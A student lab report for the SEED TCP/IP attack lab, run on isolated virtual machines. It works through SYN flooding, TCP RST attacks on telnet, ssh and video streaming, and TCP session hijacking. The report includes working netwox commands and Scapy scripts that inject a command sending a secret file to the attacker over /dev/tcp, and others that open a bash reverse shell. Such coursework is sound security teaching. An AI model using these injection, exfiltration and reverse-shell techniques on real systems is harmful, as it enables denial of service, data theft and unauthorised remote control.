---
title: "SEED LAB: TCP/IP Attack Report"

date: "2021-10-14"

tags: ["seedlab", "lecture", "network", "security"]


links:
    website: 'https://seedsecuritylabs.org/Labs_16.04/Networking/TCP_Attacks/'
    alias: TCP_Attacks
---

[TCP_Attacks Question File](https://seedsecuritylabs.org/Labs_16.04/Networking/TCP_Attacks/)


# SEED LAB: TCP/IP Attack Report

## Configure before starting

If you only want to know whether tasks are completed, please feel free to jump this Section. It is related to our works, but it is not about the tasks. However, they are essential if you want to get the same results as me step by step. 

### 0.1 Configure Virtual Machine

In this report, we cloned another virtual machine and set the two machines in same NAT networks.

```Shell
# Commands for the victim 01
$ echo 'export PS1="[VTM1]\[\e[1;34m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
# Commands for the victim 02
$ echo 'export PS1="[VTM2]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
# Commands for the attacker
$ echo 'export PS1="[ATC]\[\e[1;31m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
```

We also used the commands above to configure their bash prompt, which can help us identify them more easily. As the image shows, we used the left one as server and right one as attacker.  

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_1560f8c21056c99c8028c0d4379ec377.png"/>
<figcaption>Figure 0.1 "Bash Promp" for the three VMs</figcaption><br>
</figure>

<div style="page-break-after: always;"></div>

### 0.2 Configure VMs

We assumed an apache server run on VM "*VTM1*" as the victim of SYN flooding attack. The address for the server is `10.0.2.7:23`. The attacker is VM "*ATK*" whose IP is `10.0.2.15`

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_9cb07f1ccd5bd0cae68ddb0065ac038d.png"/>
<figcaption>Figure 1.1.2 IP Address for the attacker and the Server</figcaption><br>
</figure>

We also used the command below to check the size for the half-opened connection queue. 

```Shell
$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog
```

The image below shows the size of the queue in "*VTM1*" is $128$. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_8c7363e2eabbff189a813013bbcf83a2.png"/>
<figcaption>Figure 1.1.2 The half-opened connection queue size for "VTM1"</figcaption><br>
</figure>

## Task 1: SYN Flooding Attack

### 1.1 Lauching an attack without cookies

Before launching an SYN flooding, we first deactivated the TCP Cookie protection, and the command `sysctl` was used there. The options `-a` and `-w` detected and controlled the current state of the protection respectively. 

```Shell
# Command for the state detection
$ sudo sysctl -a | grep cookie
# Command for deactivation
$ sudo sysctl -w net.ipv4.tcp_syncookies=0
```

The image below is the outputs we got. After executing the first one, we found the value for `tcp_syncookies` is $1$, which means the protection is activated. Then, we used the second command to deactivate it.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_8161a538abee34a267026e2c1fe4d7ad.png"/>
<figcaption>Figure 1.1.3 Checking and deactivating TCP Cookie mechanism </figcaption><br>
</figure>


We used the command `netwox 76` to launch attack, the `--help` was used first for us to check the format for its usage. The image below shows what we got there. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_fc678f0f83e2b4d978e3ff4fcf4a4b56.png"/>
<figcaption>Figure 1.2.1 The help document of netwox 76</figcaption><br>
</figure>

The section below shows all commands we used after that. We used the command  `netstat` to detect all half-open connections in the server, in which the option `-t` specifies we only want TCP connection. The following `grep` was used to filter out only connection to port number 80 where our server used. As we mentioned, the `netwox 76` to launch an attack, in which we specified the IP (`10.0.2.7`) and port number (`70`) of the victim server. 

```Shell
# Command to detect connection before attacking 
$ netstat -nat | grep 23
# Command to launch the SYN DoS attack
$ sudo netwox 76 -i 10.0.2.7 -p 23
# Command to detect connection after attacking 
$ netstat -nat | grep 23
```

The image below shows the outputs for executing these commands. The output of command 01 shows there was no half-open connection before attacking, and that of command 03 was utterly different where the result had more the `SYN_RECV` connection. Besides, we also tried to connect the "*VTM1*" from the "*VTM2*" directly by command 04, and the output was a time-out warning. That proven that we successfully launch the SYN flooding in here. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_dc639b6faac6d5707600df16c6ba7c3d.png"/>
<figcaption>Figure 1.2.2 The outputs for the previous three commands to launch SYN  flooding </figcaption><br>
</figure>

As the image below shows, we also used the Wireshark in "*VTM1*" to capture our attacking package as the task document required. The package display filter we used is `tcp.port == 23`, so the program will only capture the TCP packages to port $23$. There were only the SYN packages displayed on the Wireshark, and all of there SYN packages came from random IP addresses. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_676c43ec914caf0d1aaf70a58e2b778c.png"/>
<figcaption>Figure 1.2.3 Captured packages in Wireshark without TCP cookies protection </figcaption><br>
</figure>

### 1.2 Observing the attack with cookies 

We tried to relaunch the attack with the protection of TCP cookies. The first step was to activate the protection mechanism by the command below. We used the `netstat` again in there to check the half-open connection in the server. 

```Shell
# Command for activating the TCP cookies
$ sudo sysctl -w net.ipv4.tcp_syncookies=1
# Command for checking the half-open connection before and after attacking
$ netstat -nat | grep 23
```

The image below shows the outputs and the order of these commands. Compared with that without cookies, there are no any `SYN_RCV` connection occurred in "*VTM1*"

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_ec839195f3266737e2b1ab07d9a716e0.png"/>
<figcaption> Figure 1.3.2 Captured packages in Wireshark with TCP cookies protection </figcaption><br>
</figure>


Furthermore, Wireshark was running to verify these SYN packages arrived during attacking. We found that there still a large number of SYN packages received by the server, but the half-open connections were not established. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_ff2f6c7a6768440b1b83004dad4ca49f.png"/>
<figcaption> Figure 1.3.2 Captured packages in Wireshark with TCP cookies protection </figcaption><br>
</figure>

In origin TCP protocol, a server will maintain information until a link is established, and this information will be stored in a queue. The attacker sends a large number of TCP connection initializing requests to make the queue full so that not able to handle a new request from other users.  
By contrast, with the TCP cookies mechanism, the TCP server will not need to store any information locally during link establishing. The server will generate a hash value with all essential parameters, and it will send an ACK package with the cookies to the client. The client can send the next package with the cookies so that the server can check the validation of the session by recalculating the cookies. In the whole process above, the attacker will not need to store any local information, so a DoS attack will never succeed in this case, no matter how many SYN packages are sent.

<div style="page-break-after: always;"></div>

## Task 2: TCP RST Attacks on telnet and ssh Connections

### 2.1 RST Attacks on Telnet 

#### 2.1.1 Preparation for attacks

In this task, we used the "*VTM1*" (`10.0.2.7`) and "*VTM2*" (`10.0.2.6`) as the TELNET (or SSH) server and client respectively. The "*ATK*" was used as the attacker. All these VMs were put into an single LAN. 

We make the "*VTM2*" successfully connect with the "*VTM1*" by executing command `telnet 10.0.2.7 23` on the virtual machine.


#### 2.1.2 Attack from Netwox

Similarly, we first reviewed the usage of the `netwox 78` which were used to launch an attack. The image below shows the the help document. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_191034e941a06815bea311aefb09baad.png"/>
<figcaption> Figure 2.1.1 Help pdocument of netwox 78</figcaption><br>
</figure>

The following section is all commands we used in the tasks.  The first established a telnet connection between "*VTM1*" and "*VTM2*". The second `netwox 78` command from "*ATK*" will send an RST package to "*VTM2*". The client will close the connection after receiving such a package. 

```Shell
# Establishing the connection (on VM2)
$ telnet 10.0.2.7 23
# Launching an attack (on ATK)
$ sudo netwox 78 -i 10.0.2.7
```

The image below shows the outputs of these commands. The Telnet connection was closed, which proven that our attack was success. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_d80c2de1000fba7a99cb70314d5383c6.png"/>
<figcaption> Figure 2.1.2 An attack for Telnet connetion </figcaption><br>
</figure>

### 2.2 Attack to SSH


After that, we also tried to launch an attack by a same command to a SSH connection (We use `ssh 10.0.2.7` to establish). As the image below shows, the SSH connection also closed after attacking. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_db362e039b8ea3c92cfcecfe542a4bb7.png"/>
<figcaption> Figure 2.2.1 An attack for SSH connection </figcaption><br>
</figure>

### 2.3 Attack from Scapy

Before modifying the script code, we first ran the Wireshark on the "*ATK*" to observe the expected next sequence number, because the TCP package with invalid seq number will be discard. We used the Wireshark to capture all these Telnet packages from the server to client by defining the filter `ip.src == 10.0.2.7 and ip.dst == 10.0.2.6 and tcp.port == 23`. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_ffc9bf7ddf9645af9c550550e8398232.png"/>
<figcaption> Figure 2.3.1 Last captured TCP package from Telnet server to client. </figcaption><br>
</figure>

The image above shows the last package captured. We used the values, such as content length, src IP, dst IP, ack and sequence number, to construct our new Python Script as below:

```python
#!/usr/bin/python
# in tcp_rst.py file
from scapy.all import *
ip = IP(src="10.0.2.7", dst="10.0.2.6")
tcp = TCP(
    sport=23, dport=52664,
    flags="R",
    seq=2540961750+27, ack=558035860
)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```

(PS the new seq number is the sum of the previous seq number and the content length of previous package)

After executing the python script with sudo, we got the output as the image shows below. The TelNet connection was closed, which proven that our attack succeed.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_f43619fa3ca0e8f55b99e73b22bc4977.png"/>
<figcaption> Figure 2.3.2 Output after executing the python script </figcaption><br>
</figure>

<div style="page-break-after: always;"></div>

## Task 3: TCP RST Attacks on Video Streaming Applications
We first use our victim machine to open a video site, in this case, Youtube. And then we choose an arbitrary video to view.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_91e5b608486952931d5ad738925d0f63.png"/>
<figcaption> Figure 3.1 Browsing Youtube </figcaption><br>
</figure>

Then we do the same thing like in task5, we start the TCP RST attack by netwox towards the victim ip 10.0.2.15.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_e49f71502f89f0271ae2dacc3c2a3a8a.png"/>
<figcaption> Figure 3.2 Launch TCP RST Attack </figcaption><br>
</figure>

Clearly, our video loading stuck at some point when we have played the loaded contents.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_7ef296c04ff2ab0305daeeb7d6fbd90e.png"/>
<figcaption> Figure 3.3 Loading Stuck </figcaption><br>
</figure>

We then try to refresh the page or click other videos to continue. We will see the connection lost warning, showing that the TCP connection has been interrupted successfully.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_bcf52e29c3ca0850ae5b2669eb01e652.png"/>
<figcaption> Figure 3.4 Connection Lost </figcaption><br>
</figure>

<div style="page-break-after: always;"></div>

## Task 4: TCP Session Hijacking

### 4.1 Preparation for the attack

In this task, we used the same configuration with Task 2, in which the "*VTM1*" (`10.0.2.7`) and "*VTM2*" (`10.0.2.6`) were used as the TELNET (or SSH) server and client respectively. The "*ATK*" was used as the attacker. All these VMs were put into an single LAN. 

At first, we created a `secret` file in the directory `/home/seed` by executing the following command in "*VTM1*". 

```Shell
$ echo "this is secret" >> /home/seed/secret
```

And then, we followed the instructions in the task document to convert our command into ASCII encoding by Python below. We convert the command `cat /home/seed/secret > /dev/tcp/10.0.2.15/9090` into the encoded hex string, `0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f31302e302e322e31352f393039300d`

```Shell
$ python -c "print('\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r'.encode('hex'))"
```

In the converted command, we outputed the content of the secret file to a tcp socket binded with `10.0.2.15:9090`, which is the IP address of attacker. Therefore, we used `netcat` command below to receive the file.  

```Shell
$ nt -lv 9090
```

The image below shows outputs of all commands we executed during preparation. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_054d2f90ec0b8c95f6340ba4a9cabf99.png"/>
<figcaption> Figure 4.1.2 The last captured Telnet package by Wireshark</figcaption><br>
</figure>

### 4.2 Attack by Netwox

Before launching attack, it was essential to know the sequence number for the next package. We used Wireshark to get all data there. The image below shows the last Telnet package we got from Wireshark. We prepared with the ip, port numbers given, which were 10.0.2.6:39172 (client) and 10.0.2.7:23 (Server). Also, we could use the above Seq number and Ack number. Finally, we set the flag as Ack and set the data with our reverse Shell code command like the following. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_6f7b9de46e88b5bd5a0b62838cf1b2f3.png"/>
<figcaption> Figure 4.2.1 The last captured Telnet package by Wireshark</figcaption><br>
</figure>

Then, we used the `netwox 40` to launch the attack, and the image below shows the help document of it. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_0873f3d0f9a46b4ff4e7f0347ecc9658.png"/>
<figcaption> Figure 4.2.1 The help document of the netwox 40</figcaption><br>
</figure>


Then, we used the command below to steal the secret. 

```Shell
$ sudo netwox 40 \
    -l 10.0.2.6 -o 39172 \
    -m 10.0.2.7 -p 23 \
    -q 3144319184 -r 2594595218 -z \
    -j 64 -E 237 -H 0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f31302e302e322e31352f393039300d
```

The image below shows that we successfully access the data inside of the screte file in "*VTM1*" by the `netcat` on "*ATK*". 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_132822999242ee8170a3cfd3ff6d74db.png"/>
<figcaption> Figure 4.2.2 Executing of the attack from the netwox</figcaption><br>
</figure>

(PS. After attacking, the TelNet connection was completely lose control on "*VTM2*". Therefore, we restarted a new connection for following tasks)

### 4.3 Attack by Scapy

We also implemented the attack by the Python package, Scapy. Before attacking, we used the Wireshark again to get the last TelNet package. The port number (39176), sequence number (3770990930) and ACK number (1042719746) were updated. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_f76c4056f53cc38d9b1f585e88e36e42.png"/>
<figcaption> Figure 4.2.2 Executing of the attack from the netwox</figcaption><br>
</figure>

Based on the values in the last TCP package, we constructured the script codes for attacking. 

```Python
#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.6", dst="10.0.2.7")
tcp = TCP(
    sport=39176, dport=23, flags="A",
    seq=3770990930, ack=1042719746
)
data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
```

After lauching the attack, we got the output below, which shows that we successfully access the secret file form the "*VTM1*". 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_132822999242ee8170a3cfd3ff6d74db.png"/>
<figcaption> Figure 4.3.2 Outputs for the commands</figcaption><br>
</figure>

<div style="page-break-after: always;"></div>

## Task 5: Creating Reverse Shell using TCP Session Hijacking

In this task, we used the similar configuration as before. The attacker's IP was `10.0.2.15`. The IP of Server and client were `10.0.2.7` and `10.0.2.6` respectively. 
In the end, we expected to see that the attack machine hijacked the telnet connection between the victim and the server, and it could run the Shell as the victim machine on the server.

We first built the telnet connection as the following and we also used the command `netstat -tna | grep 10.0.2.6` to verify the connection. 

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_51bab920ad71225615ac577a81de5923.png"/>
<figcaption> Figure 5.1 Establishing the Telnet from Client to Server </figcaption><br>
</figure>

On the attack machine, we ran the wireshark that captured the last package between the victim and the server.

<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_dcd07ce76b527ce17359e64c5e4e8aac.png"/>
<figcaption> Figure 5.2 Running Wireshark to check the Seq and Ack number </figcaption><br>
</figure>

We then prepared the scapy file with the ip, port numbers given, which were 10.0.2.6:44528 (client) and 10.0.2.7:23 (Server). Also, we could use the above Seq number and Ack number. Finally, we set the flag as Ack and set the data with our reverse Shell code command like the following.

```Python
#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.6", dst="10.0.2.7")
tcp = TCP(
    sport=44528, dport=23, flags="A",
    seq=3684699739, ack=520936048
)
data = "\r /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
```

We then run the scapy file after we start listening the 9090 port. We can see that we get the Shell and we can run a simple command `hostname -I` to show that we have hijacked the telnet connection from the victim to the server since the ip becomes 10.0.2.7, which is the server now.


<figure>
<img style="width:100%" src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_6cdb0f649b4bd92d9715e65a024e279a.png"/>
<figcaption> Figure 5.4 Running the attack </figcaption><br>
</figure>

